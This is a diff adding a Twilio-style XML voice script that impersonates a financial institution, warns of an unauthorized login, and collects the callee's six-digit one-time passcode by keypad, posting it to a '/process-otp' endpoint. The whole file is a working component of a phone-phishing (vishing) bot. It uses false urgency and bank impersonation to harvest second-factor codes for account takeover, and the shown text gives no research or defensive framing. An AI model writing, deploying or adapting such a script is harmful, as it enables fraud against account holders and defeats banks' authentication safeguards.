@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Say voice="alice" language="en-US">
+        Security alert from your financial institution. We have detected an unauthorized login attempt on your account. To secure your profile and verify your identity, please enter the six-digit one-time passcode sent to your mobile device now.
+    </Say>
+    <Gather input="dtmf" timeout="10" finishOnKey="#" action="/process-otp" method="POST">
+        <Say voice="alice" language="en-US">
+            Please enter the code followed by the pound key.
+        </Say>
+    </Gather>
+    <Say voice="alice" language="en-US">
+        We did not receive your input. Please contact our support line immediately. Goodbye.
+    </Say>
+    <Hangup/>
+</Response>
